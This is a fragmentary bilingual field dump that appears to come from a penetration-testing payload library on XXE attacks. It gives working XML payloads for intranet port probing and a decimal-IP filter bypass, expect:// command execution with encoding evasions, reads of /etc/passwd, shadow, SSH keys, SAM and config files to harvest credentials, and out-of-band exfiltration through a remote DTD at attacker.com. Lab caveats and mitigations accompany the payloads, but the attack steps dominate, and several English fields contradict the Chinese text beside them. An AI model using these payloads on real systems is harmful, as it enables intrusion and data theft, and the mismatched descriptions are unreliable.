explanation.en: Exfil entity from the external DTD

name.zh: XXE 到受控 HTTP 夹具验证

description.zh: 覆盖经 XXE 发起 SSRF 的内网探测验证：从 22/80/443 等内网端口逐一探测，到本机 Redis 端点探测，并附十进制整数 IP 变体，用于确认实体解析器能否充当内网探测源。
description.en: Covers intranet probing validation of SSRF via XXE: from port-by-port probing of intranet ports such as 22/80/443 through local Redis endpoint probing, with decimal integer-IP variants, confirming whether the entity parser can act as an intranet probing source.

prerequisites.zh: 确认 XXE 到受控 HTTP 夹具验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XXE-to-Controlled-HTTP Fixture Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖经 XXE 发起 SSRF 的内网探测验证：以独立 XML 样例逐一探测内网 22/80/443 端口、探测本机 6379 回环服务，并附十进制整数 IP 变体。用于确认实体解析器能否充当内网探测源。
overview.en: Covers intranet-probing verification of XXE-driven SSRF: probing intranet ports 22/80/443 one by one with standalone XML samples, probing the local 6379 loopback service, plus a decimal-integer IP variant. Used to confirm whether the entity parser can serve as an intranet probing source.

vulnerability.zh: 根因是解析器允许实体指向任意 URL 且内网服务对应用来源无访问控制，实体请求的响应时间与错误差异可区分端口连通性；十进制整数 IP 形态还可绕过点分十进制过滤。
vulnerability.en: The root cause is a parser allowing entities to point at arbitrary URLs while intranet services lack access control against the application's origin: response-time and error differentials distinguish port reachability, and decimal-integer IP forms additionally bypass dotted-decimal filters.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步对内网目标 22、80、443 端口各生成独立完整 XML 样例逐个提交，以响应时间与错误差异区分端口连通性，某端口响应特征不同即确认解析器可达该端口；第 2 步以实体请求本机 6379 端口验证回环服务触达。被 WAF 拦截时改用十进制整数 IP 变体。探测仅限授权范围内目标。
exploitation.en: Use in Payload list order: step 1 generates a standalone complete XML sample for each intranet port 22, 80, and 443 and submits them one by one; different response characteristics on a port confirm the parser can reach it, judged by response-time and error differentials. Step 2 requests the local port 6379 via an entity to verify loopback service reachability. When blocked by a WAF, switch to the decimal-integer IP variant. Probe only targets within the authorized scope.

mitigation.zh: 解析器禁用外部实体，网络层对应用出口实施内网地址阻断与协议白名单，回环服务加认证；修复后重放探测载荷应全部失败且响应间无端口差异信号。
mitigation.en: Disable external entities in the parser, block intranet address ranges at the application egress with protocol allowlists, and authenticate loopback services; after the fix, replayed probes must all fail with no port-differential signals across responses.

description.zh: 把实体依次指向内网地址的常用端口提交，响应时长与报错差异区分开放与关闭端口，逐步绘制内网端口存活图谱。
description.en: Point SYSTEM identifiers at intranet 22/80/443 in turn; timing and error differences separate open from closed ports.

description.zh: 实体指向本机服务端点如 Redis 信息路径，响应携带服务信息即确认内网服务可达，并完成服务指纹收集。
description.en: Aim entities at localhost endpoints like Redis /info; service details in the response confirm reachability and fingerprint the service.

title.zh: 十进制 IP 变体绕过限制
title.en: Use decimal IP variants to bypass restrictions

description.zh: 地址黑名单按字符串匹配时把 IP 转为十进制整数形式书写，解析后指向不变，探测请求照常到达内网目标生效。
description.en: When blacklists match IP strings, write addresses as decimal integers that resolve identically and still reach the target.

analysis.zh: XXE 到受控 HTTP 夹具验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XXE-to-Controlled-HTTP Fixture Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 把外部实体指向受控内部标记服务，验证解析器出站边界而不访问真实内网。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

execution.command:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<foo>&xxe;</foo>

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
]>
<foo>&xxe;</foo>

description.zh: 对 192.168.1.1 的 22、80、443 端口各生成一个独立完整 XML 样例并逐个提交；以响应时间与错误差异区分端口连通性，某端口响应特征不同即确认解析器可达该内网端口。
description.en: Generate one independent XML sample per port (22/80/443) on 192.168.1.1 and submit them one at a time; response-time and error differences distinguish reachability, and a distinctive response on a port confirms the parser reaches that intranet port.

explanation.zh: 外部实体声明，指向受控目标
explanation.en: External entity declaration targeting the controlled host

title.zh: 本机 Redis 端点探测

explanation.zh: 回环地址上的 Redis 信息端点
explanation.en: Redis info endpoint on the loopback address

description.zh: 通过实体请求本机 6379 端口的 /info 路径，验证解析器能否触达回环地址上的服务。
description.en: Requests the /info path on local port 6379 through an entity to check whether the parser reaches services on the loopback address.

title.zh: 十进制整数 IP 变体

description.zh: 用十进制整数 2130706433 表示 127.0.0.1，验证基于点分十进制字符串匹配的过滤是否被整数编码绕过。
description.en: Represents 127.0.0.1 as the decimal integer 2130706433 to test whether filters matching dotted-decimal strings are bypassed by integer encoding.

name.zh: XXE 到代码执行主张校验

description.zh: 覆盖 XXE 升级到代码执行的前提校验：以 expect:// 外部实体在启用 expect 扩展的隔离夹具中输出固定标记，并区分文件写入等独立影响条件，用于确认 XXE 到 RCE 的成立条件。
description.en: Covers precondition validation for escalating XXE to code execution: emitting fixed markers with expect:// external entities inside isolated fixtures where the expect extension is enabled, while separating independent impact conditions such as file writes, confirming when XXE-to-RCE holds.

prerequisites.zh: 确认 XXE 到代码执行主张校验 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XXE-to-Code-Execution Claim Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XXE 升级到代码执行的前提校验：expect:// 外部实体仅在安装并启用 expect 扩展的隔离 PHP 夹具中输出固定标记，文件写入、Web 目录权限与代码执行作为独立影响条件分离验证。用于确认 XXE 到 RCE 的真实成立条件。
overview.en: Covers precondition verification for escalating XXE to code execution: the expect:// external entity emits a fixed marker only inside an isolated PHP fixture with the expect extension installed and enabled, while file writes, web-root permissions, and code execution are verified as independent impact conditions. Used to establish the real preconditions for XXE-to-RCE.

vulnerability.zh: 根因是 PHP expect 扩展把 expect:// 包装器暴露给 XML 解析器，实体内容随即被当作命令执行；该能力取决于扩展安装与启用状态，与文件写入能力是两条独立路径，不能互相推导。
vulnerability.en: The root cause is the PHP expect extension exposing the expect:// wrapper to the XML parser, so entity content is executed as a command; this capability depends on the extension's install/enable state and is a separate path from file writing — neither implies the other.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在安装并启用 expect 扩展的隔离 PHP 夹具中以 expect:// 实体输出固定标记，标记出现即确认命令执行前提成立；第 2 步单独验证文件写入与 Web 根目录权限等独立条件。原始 expect URI 被拦截时改用 Expect URI 编码变体；验证时以无子进程的测试 wrapper 替代真实命令。
exploitation.en: Use in Payload list order: step 1 emits a fixed marker via an expect:// entity inside the isolated PHP fixture with the expect extension enabled; the marker appearing confirms the command-execution precondition. Step 2 verifies independent conditions such as file writes and web-root permissions separately. When the raw expect URI is blocked, switch to the Expect URI-encoding variant; during verification, use a subprocess-free test wrapper instead of real commands.

mitigation.zh: 生产 PHP 禁用 expect 扩展，解析器禁用外部实体与自定义 wrapper，文件写入与解析权限分离；修复后重放 expect 载荷应报未知 wrapper 且无标记输出。
mitigation.en: Disable the expect extension in production PHP, forbid external entities and custom wrappers in the parser, and separate file-write from parse privileges; after the fix, replaying expect payloads must report an unknown wrapper with no marker output.

title.en: Run commands via the expect wrapper

description.zh: 实体使用 expect 前缀携带系统命令，PHP 装载 expect 扩展时命令被执行，响应回显输出即达成远程代码执行。
description.en: Set the SYSTEM identifier to expect:// with an OS command; on PHP builds with the expect extension the command runs and echoes back.

title.zh: 分离验证命令与文件写入边界
title.en: Separate command execution from file writes

description.zh: 换用第二标记命令再执行一轮，两次输出独立出现即证明命令执行与文件写入互不混淆，链路归因清晰可复用推进。
description.en: Re-run with a second marker command; two independent outputs keep command execution cleanly separated from file-write effects.

title.zh: URI 编码变体穿透过滤
title.en: Use URI-encoded variants to pass filters

description.zh: 命令文本被过滤时对 expect 载荷做百分号编码，规则匹配原始关键字失效，解码后命令照常执行拿到结果。
description.en: Percent-encode the expect payload when command text is filtered; the decoded command still executes past the rule.

analysis.zh: XXE 到代码执行主张校验只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XXE-to-Code-Execution Claim Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 把 XXE、PHP expect 扩展和命令执行视为独立前置条件，本条只验证安全的外部实体加载。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.zh: PHP expect 包装器前提验证

description.zh: 保留 expect:// 外部实体形式，但只在安装并启用 expect 扩展的隔离 PHP 夹具中输出固定标记；外部实体解析本身不能证明命令执行。
description.en: Retain the expect:// external-entity form but emit only a fixed marker in an isolated PHP fixture with the expect extension installed and enabled; external-entity parsing alone does not prove command execution.

title.zh: XXE 与文件写入边界分离

description.zh: 判据: 本步骤仅执行第二个固定 expect 标记做复验；文件写入、Web 根目录权限与代码执行属于相互独立的影响条件，需分别单独验证，不能由标记输出互相推导。
description.en: Remove the mixed web-shell write chain and retain a second fixed expect marker for an authorized lab. File writes, web-root permissions, and code execution are independent impact conditions.

description.zh: Expect URI 编码变体 — 对 expect:// 之后的命令做百分号 URI 编码（空格写为 %20），规避明文空格与命令关键字特征；成功判据：授权夹具中 expect 扩展日志与固定标记输出同时出现。
description.en: Replace the generalized claim that Base64 bypasses command filtering with a reproducible URI-encoding variant, requiring both expect-extension logs and the fixed marker in an authorized fixture.

description.zh: 命令 base64 化执行，规避 expect://id 明文特征；成功判据：返回 uid 输出。
description.en: Base64-encodes the command to evade the plaintext expect://id signature. Success: uid output returned.

description.zh: $IFS 代替空格，规避对 expect://cat /flag 空格特征的匹配；成功判据：flag 内容回显。
description.en: Uses $IFS for whitespace to evade matching of expect://cat /flag with spaces. Success: flag contents echoed.

description.zh: expect 调用经参数实体中转并引号拆分命令，双重规避直连特征；成功判据：用户名回显。
description.en: Routes the expect call through a parameter entity with quote-split command for double evasion. Success: username echoed.

title.zh: 通用 XML PHP Expect 实体边界

description.zh: 以 expect:// 包装器声明实体；wrapper 返回当前任务 marker 即确认 expect 包装器被解析。绝不运行原始 id 命令，只用无子进程测试 wrapper 返回 marker。
description.en: Declare the entity with an expect:// wrapper; the wrapper returning the current job marker confirms the expect wrapper is parsed. Never run the source id command — use only a no-child-process test wrapper that returns the marker.

name.zh: XXE 本地文件实体读取

description.zh: 覆盖 XXE 本地文件读取验证：从 /etc/passwd 与 Windows win.ini，到应用配置文件与源代码读取，并附参数实体变体，用于确认 XML 解析器的文件实体暴露面。
description.en: Covers XXE local file read validation: from /etc/passwd and Windows win.ini through application configuration and source-code reads, with parameter-entity variants, confirming the file-entity exposure of XML parsers.

subCategory.zh: 通用与 XSLT 文件读取

prerequisites.zh: 确认 XXE 沙箱文件实体验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XXE Sandbox File-Entity Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XXE 本地文件读取验证链：/etc/passwd 与 Windows win.ini 平台探测、应用配置文件与源代码读取、php://filter Base64 编码读取。用于确认 XML 解析器的文件实体暴露面与可读取范围。
overview.en: Covers the local file-read verification chain for XXE: platform probes against /etc/passwd and Windows win.ini, application config and source-code reads, and php://filter Base64-encoded reads. Used to map the XML parser's file-entity exposure and readable scope.

vulnerability.zh: 根因是解析器允许外部通用实体且 SYSTEM 标识符可指向任意本地路径，实体内容随解析结果回显；应用配置与源码同在读取范围内，php://filter 可编码读取非文本文件。
vulnerability.en: The root cause is the parser allowing external general entities whose SYSTEM identifiers can point at any local path, with entity content echoed through parse results; application configs and source code fall in scope, and php://filter reads non-text files in encoded form.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以内部实体读取 /etc/passwd，回显文件内容即确认读取成功，可按需枚举 shadow、hosts、id_rsa 等路径；第 2 步读 win.ini 验证 Windows 平台；第 3 步读应用配置文件确认敏感信息可读；第 4 步以 php://filter Base64 读取源码，解码即确认非文本读取链。被 WAF 拦截时改用参数实体变体。
exploitation.en: Use in Payload list order: step 1 reads /etc/passwd via an internal entity; echoed file content confirms the read, with optional enumeration of shadow, hosts, id_rsa, and similar paths. Step 2 reads win.ini for Windows; step 3 reads application config files to confirm sensitive data exposure; step 4 reads source via php://filter Base64, decoding to confirm the non-text read chain. When blocked by a WAF, switch to the parameter-entity variant.

mitigation.zh: 解析器禁用 DTD 与外部实体，解析进程以低权限运行并限制文件系统视图；修复后重放各文件载荷应报实体禁止错误，响应中无任何文件内容。
mitigation.en: Disable DTDs and external entities in the parser, run the parsing process with low privileges and a restricted filesystem view; after the fix, replaying each file payload must raise entity-forbidden errors with no file content in responses.

title.zh: 读取 passwd 确认文件通道
title.en: Confirm the file channel with passwd

description.zh: 实体指向系统账户文件提交，响应带出账户列表即确认任意文件读取能力，Linux 侧首先落地稳定读取通道。
description.en: Point the entity at /etc/passwd; the returned account list confirms arbitrary file read on the Linux side.

title.zh: 读取 Windows 系统文件

description.zh: 换目标到 Windows 系统配置文件，内容回显确认该类路径同样可读，按操作系统切换后续目标清单继续收集。
description.en: Switch to c:/windows/win.ini; echoed contents confirm Windows paths read too, tuning the next target list per OS.

title.zh: 读取 Web 配置收获凭据

description.zh: 指向 Web 根下配置文件，数据库口令与密钥直接暴露在响应中，凭据可用于直连数据库横向扩大控制范围。
description.en: Aim at web root configs like config.php; database passwords and keys surface for direct connection and deeper control.

description.zh: 用 php filter 以 base64 编码读取源码文件，绕开解析执行限制，解码后获得完整应用逻辑用于挖掘更多漏洞。
description.en: Base64-read index.php via php://filter to bypass parsing, then decode the full source to hunt further weaknesses.

title.zh: 参数实体变体维持读取

description.zh: 一般实体被禁时改用参数实体经内部实体中转内容，读取链路保持可用，继续按目标清单收割服务器上的敏感文件数据。
description.en: If general entities are banned, launder contents through parameter entities to keep the read chain alive for further files.

analysis.zh: XXE 沙箱文件实体验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XXE Sandbox File-Entity Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 只引用 XML 沙箱中的固定标记文件，验证外部实体文件访问而不读取系统或应用文件。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 用内部实体读取目标文件验证文件读取；回显出现文件内容即确认读取成功。其余可选目标：file:///etc/shadow、file:///etc/hosts、file:///root/.ssh/id_rsa、file:///proc/self/environ。
description.en: Read the target file via an internal entity to confirm file read; the content in the response confirms success. Other candidate targets: file:///etc/shadow, file:///etc/hosts, file:///root/.ssh/id_rsa, file:///proc/self/environ.

explanation.zh: 实体引用展开文件内容
explanation.en: Entity reference expanding the file content

description.zh: 用内部实体读取 win.ini 验证 Windows 文件读取；回显出现 win.ini 内容即确认读取成功。其余可选目标：file:///c:/windows/system32/config/sam、file:///c:/users/administrator/.ssh/id_rsa。
description.en: Read win.ini via an internal entity to confirm Windows file read; win.ini content in the response confirms success. Other candidate targets: file:///c:/windows/system32/config/sam, file:///c:/users/administrator/.ssh/id_rsa.

explanation.zh: 读取 win.ini 的外部实体
实体引用展开文件内容
explanation.en: Entity reference expanding the file content

description.zh: 用内部实体读取应用配置文件验证敏感信息读取；回显出现配置内容即确认敏感文件可读。其余可选目标：file:///var/www/html/wp-config.php、file:///app/.env、file:///app/config/database.yml。
description.en: Read an application config file via an internal entity to confirm sensitive-file access; config content in the response confirms success. Other candidate targets: file:///var/www/html/wp-config.php, file:///app/.env, file:///app/config/database.yml.

explanation.zh: 读取 config.php 的外部实体
实体引用展开文件内容
explanation.en: Entity reference expanding the file content

description.zh: 以 php://filter Base64 读取目标源码文件；回显 Base64 串且解码得到源码即确认源码读取链可用。
description.en: Read the target source file via php://filter Base64; a Base64 string that decodes to source confirms the source-read chain.

explanation.zh: filter链Base64编码包装：防止PHP文件被执行
引用实体触发读取，响应返回Base64源码

description.zh: 以参数实体包装文件实体读取；仍能回显目标文件内容即确认参数实体形式可用、仅拦通用实体的过滤被绕过。
description.en: Wrap the file entity in a parameter entity; the target file content still reflected confirms the parameter-entity form works and filters that only block general entities are bypassed.

explanation.zh: 参数实体指向passwd(%声明参数实体)
普通实体引用参数实体的值
文档中引用普通实体完成回显

title.zh: 无 XML 声明压缩形态

description.zh: 去掉 <?xml 声明并压缩空白，规避“声明+DOCTYPE”完整结构匹配；成功判据：passwd 内容回显。
description.en: Drops the <?xml declaration and whitespace to evade matching of the full declaration+DOCTYPE structure. Success: passwd contents echoed.

description.zh: 利用 file:/ 与 file:/// 等价性绕过 file:/// 固定前缀检测；成功判据：文件内容仍被读取。
description.en: Exploits equivalence of file:/ and file:/// to bypass the fixed file:/// prefix check. Success: the file is still read.

description.zh: 换读 /proc/self/environ 规避对 /etc/passwd 路径的专项规则；成功判据：环境变量内容回显。
description.en: Reads /proc/self/environ instead to dodge rules specific to /etc/passwd. Success: environment variables are echoed.

title.zh: 通用 XML 本地文件实体

wafBypass.command:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>

description.zh: 以通用 XML 本地实体读取两个平台路径；解析后回显 marker 内容即确认本地实体读取可用。执行前把两个系统路径按目标平台改为工作目录内不同随机 marker 文件。
description.en: Read two platform paths via generic XML local entities; marker content in the parsed output confirms local-entity reads. Before execution replace both system paths with distinct random marker files in the working directory for the target platform.

description.zh: 在路径中插入 /./ 层级段混淆明文特征，规避 file:///etc/passwd 固定字符串匹配；成功判据：文件内容仍被读取回显。
description.en: Encodes path characters as numeric entities to evade the plaintext file:///etc/passwd rule. Success: the entity resolves via the encoded path.

description.zh: 实体引用夹在 CDATA 段之间，打断 &x;</x> 结尾特征；成功判据：文件内容与前后缀一同输出。
description.en: Sandwiches the reference between CDATA sections to break the &x;</x> ending signature. Success: file contents output alongside the prefixes.

description.zh: 引用置于多层嵌套深处，规避对根节点直引的浅层规则；成功判据：深层解析展开实体。
description.en: Places the reference deep in nested elements to evade shallow rules on root-level references. Success: deep parsing expands the entity.

title.zh: 通用 XML 外部资源实体

wafBypass.command:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{FILE_PATH}">]><x>&xxe;</x>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{LAB_OAST}/">]><x>&xxe;</x>

description.zh: 以通用 XML 外部资源实体分别测试 file 与 HTTP 目标；file 行回显 marker、HTTP 行由 {LAB_OAST} 记录请求即确认资源实体可达。按实际通用 XML 入口单独测试，把目标改为 marker，不得打包成 XLSX。
description.en: Test file and HTTP targets separately via generic XML external-resource entities; the file line reflecting the marker and the HTTP line logged by {LAB_OAST} confirm resource-entity reachability. Test only at an actual generic-XML entry, rewrite targets to markers, and never package as XLSX.

name.zh: 外部 DTD 参数实体外带利用

description.zh: 覆盖外部 DTD 引用与参数实体高级用法验证：从参数实体 OOB 外带块与外部 DTD 引用，到 CDATA 包裹读取文件内容，再到报错式参数实体外带，用于确认 DTD 加载边界的绕过形态。
description.en: Covers external DTD references and advanced parameter-entity usage: from parameter-entity OOB exfiltration blocks and external DTD references through CDATA-wrapped file-content reads to error-based parameter-entity exfiltration, confirming bypass forms of the DTD loading boundary.

prerequisites.zh: 确认 外部 DTD 加载边界验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for External DTD Loading Boundary Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖外部 DTD 引用与参数实体的高级用法验证：参数实体 OOB 外带块、外部 DTD 引用、CDATA 包裹读取与报错式外带四种样例块。用于确认 DTD 加载开启后的绕过形态与可用外带通道。
overview.en: Covers advanced usage verification of external DTD references and parameter entities across four sample blocks: a parameter-entity OOB exfiltration block, an external DTD reference, CDATA-wrapped reads, and error-based exfiltration. Used to confirm bypass forms and usable exfiltration channels once DTD loading is on.

vulnerability.zh: 根因是解析器允许加载外部 DTD 子集，参数实体在外部 DTD 中可自由组合 file/eval/exfil 链；CDATA 包裹规避内容解析、报错式外带把内容并入错误信息，均绕过内部子集限制。
vulnerability.en: The root cause is the parser loading external DTD subsets where parameter entities freely compose file/eval/exfil chains; CDATA wrapping avoids content parsing and error-based exfiltration merges contents into error messages, both bypassing internal-subset restrictions.

exploitation.zh: 按 Payload 列表顺序使用：先以第 2 步引用外部 DTD，{LAB_OAST} 收到 DTD 请求即确认外部加载开启；再用第 1 步把参数实体外带块放入外部 DTD，收集端收到含文件内容的请求即确认外带成立；第 3 步用 %start;%file;%end; 把文件包进 CDATA 规避内容解析；第 4 步把文件内容塞进不存在路径借解析器报错带回内容。WAF 夹具区提供 HTTPS 拉取外部 DTD 的受控形态。
exploitation.en: Use in Payload list order: first reference an external DTD per step 2; {LAB_OAST} receiving the DTD request confirms external loading is on. Then place the parameter-entity exfiltration block into the external DTD per step 1; the collector receiving file contents confirms exfiltration. Step 3 wraps the file with %start;%file;%end; inside CDATA to avoid content parsing; step 4 stuffs file contents into a nonexistent path so parser errors carry them back. The WAF fixture section provides a controlled HTTPS external-DTD form.

mitigation.zh: 解析器禁用外部 DTD 子集与参数实体，出站网络限制为自有域；修复后重放各样例块应报实体禁止或 DTD 拒绝错误，监听端无任何请求。
mitigation.en: Disable external DTD subsets and parameter entities in the parser and restrict outbound networking to owned domains; after the fix, replaying each block must raise entity-forbidden or DTD-rejected errors with no listener requests.

title.en: Exfiltrate files with a parameter-entity block

description.zh: 远端 DTD 内先声明文件实体，再用嵌套实体把内容拼进回连地址，两级参数实体链式触发完成文件内容外带。
description.en: In the remote DTD declare a file entity, then splice contents into a callback URL through nested %eval/%exfil chaining.

title.en: Reference the external DTD from the document

description.zh: 提交的 XML 在内部声明处以参数实体拉取控制端 DTD，远端内容随即成为解析上下文一部分，为利用块铺路。
description.en: The submitted XML pulls the collector DTD through a DOCTYPE parameter entity, making remote content part of the parse context.

description.zh: 用起始、结束与聚合三个参数实体把文件内容包进 CDATA 区段，多行内容不再破坏结构，整段顺利完成外带。
description.en: Three parameter entities wrap file contents in a CDATA section so multi-line data survives the XML structure and exfiltrates whole.

description.zh: 回连被阻断时把文件内容拼进不存在的文件路径，解析报错消息携带数据返回页面，借报错通道完成数据外带回收。
description.en: When callbacks are blocked, splice contents into a nonexistent path; the parser error message carries the data back to the page.

title.zh: 本地拉取 DTD 控制内容
title.en: Pull the DTD locally to control content

description.zh: 用 curl 把构造好的 DTD 拉到本地核对语法与编码，确认无误后再挂到服务路径，保证第 1 步外带链可靠触发。
description.en: Curl the crafted DTD locally to check syntax and encoding before hosting it, ensuring the step 1 chain fires reliably.

analysis.zh: 外部 DTD 加载边界验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: External DTD Loading Boundary Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用最小自有 DTD 和唯一标记验证参数实体加载，不嵌套文件读取或递归实体。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.zh: 参数实体 OOB 外带块

description.zh: 用参数实体把目标文件内容拼入外带 URL，作为外部 DTD 内容的完整样例块；该块放入外部 DTD 后，{LAB_OAST} 收到含文件内容的请求即确认外带成立。
description.en: Assemble the target file into an OOB URL with parameter entities — a complete sample block for external DTD content; once placed in an external DTD, the file-carrying request arriving at {LAB_OAST} confirms the exfil.

explanation.zh: 参数实体读取目标系统文件
explanation.en: Parameter Entity Read Target System File

explanation.zh: %的HTML实体编码，在实体定义中引用其他参数实体
explanation.en: Describes how the operator segment "%" participates in this validation command.

explanation.zh: 通过HTTP请求参数外带文件内容
explanation.en: Describes how the value segment "http://attacker.com/?d=%file;" participates in this validation command.

description.zh: 引用外部 DTD 文件；{LAB_OAST} 收到 DTD 请求即确认外部 DTD 加载开启，可作为后续 DTD 内容块的载体验证。
description.en: Reference an external DTD; the DTD request arriving at {LAB_OAST} confirms external DTD loading is on, the carrier for later DTD content blocks.

explanation.zh: 定义参数实体指向远程恶意DTD文件
explanation.en: Describes how the command segment "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">" participates in this validation command.

explanation.zh: 展开参数实体，加载并执行远程DTD中的定义
explanation.en: Describes how the operator segment "%xxe;" participates in this validation command.

description.zh: 用 %start;%file;%end; 把文件内容包进 CDATA，作为外部 DTD 中规避内容解析的样例块。
description.en: Wraps file content in CDATA via %start;%file;%end;; a sample block for evading content parsing inside external DTDs.

explanation.zh: CDATA开始标记，处理文件中的XML特殊字符
explanation.en: Describes how the operator segment "<![CDATA[" participates in this validation command.

explanation.zh: 拼接CDATA标记和文件内容，避免XML解析错误
explanation.en: Describes how the variable segment "%start;%file;%end;" participates in this validation command.

explanation.zh: 展开包含完整CDATA包裹数据的实体
explanation.en: Describes how the operator segment "%all;" participates in this validation command.

title.zh: 报错式参数实体外带块

description.zh: 把文件内容塞进不存在的 file:// 路径，用解析器报错把内容带回错误信息，作为外部 DTD 报错通道样例块。
description.en: Embeds file content into a nonexistent file:// path so parser errors carry the content back; a sample block for the external-DTD error channel.

explanation.zh: 把文件内容拼进无效路径触发报错
explanation.en: Embeds file content into an invalid path to force an error

title.zh: HTTPS 拉取外部 DTD 夹具
title.en: Fetch the external DTD fixture over HTTPS

description.zh: 用 curl 从自托管 HTTPS 端点下载 DTD 夹具，验证外部 DTD 加载链路与传输协议相关的过滤是否生效。
description.en: Downloads the DTD fixture from a self-hosted HTTPS endpoint with curl to check transport-specific filtering of external DTD loading.

explanation.zh: 静默拉取，失败时非零退出
explanation.en: Silent fetch failing with a nonzero exit

explanation.zh: 自托管 HTTPS DTD 夹具地址

description.zh: 文件内容拼进不存在路径的报错消息回显，规避 OAST 出网被墙的场景；成功判据：错误页包含文件内容。
